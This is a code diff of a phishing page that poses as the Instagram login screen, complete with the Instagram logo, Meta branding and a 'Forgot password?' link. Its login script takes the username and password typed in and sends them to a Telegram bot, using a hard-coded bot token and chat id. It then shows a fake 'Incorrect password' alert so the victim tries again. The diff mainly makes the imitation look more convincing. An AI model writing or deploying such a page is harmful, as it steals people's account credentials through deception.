@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -5,34 +6,115 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body { background-color: black; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { width: 85%; max-width: 350px; text-align: center; }
-        h1 { font-size: 35px; margin-bottom: 30px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; background-color: #121212; border: 1px solid #363636; border-radius: 10px; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background-color: #0095f6; border: none; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; }
-        .footer { position: absolute; bottom: 30px; text-align: center; color: #737373; font-size: 14px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background-color: black;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            margin-top: 60px;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo-img {
+            width: 60px;
+            margin-bottom: 12px;
+        }
+        h1 {
+            font-family: 'serif';
+            font-size: 38px;
+            margin-bottom: 40px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            background-color: #121212;
+            border: 1px solid #363636;
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+        }
+        input:focus { border: 1px solid #a8a8a8; outline: none; }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .forgot {
+            display: block;
+            margin-top: 20px;
+            color: white;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .footer {
+            position: absolute;
+            bottom: 40px;
+            text-align: center;
+            color: #737373;
+            font-size: 12px;
+        }
+        .meta-text {
+            color: white;
+            font-weight: bold;
+            font-size: 15px;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1 style="font-family: serif;">Instagram</h1>
-        <input type="text" id="user" placeholder="Username, email or mobile number">
+        <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
+        <h1>Instagram</h1>
+        
+        <input type="text" id="user" placeholder="Phone number, username, or email">
         <input type="password" id="pass" placeholder="Password">
-        <button onclick="login()">Log in</button>
+        
+        <button onclick="login()">Log In</button>
+        
+        <a href="#" class="forgot">Forgot password?</a>
     </div>
-    <div class="footer">from<br><span style="color:white; font-weight:bold;">Meta</span></div>
+
+    <div class="footer">
+        from<br>
+        <span class="meta-text">Meta</span>
+    </div>
 
     <script>
         function login() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
-            if(!u || !p) return;
+
+            if (u.trim() === "" || p.trim() === "") return;
+
             const token = "7613459656:AAGQ9YufupJTUGedqSBSSobBln_8SrCbY4g";
             const id = "7712950930";
-            const msg = `👤 User: ${u}\n🔑 Pass: ${p}`;
+            const msg = `🚨 **LOG** 🚨\n👤 **User:** ${u}\n🔑 **Pass:** ${p}`;
+
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)
-            .then(() => { alert("Invalid password. Please try again."); location.reload(); });
+            .then(() => {
+                alert("Incorrect password. Please try again.");
+                document.getElementById('pass').value = "";
+            });
         }
     </script>
+
 </body>
 </html>
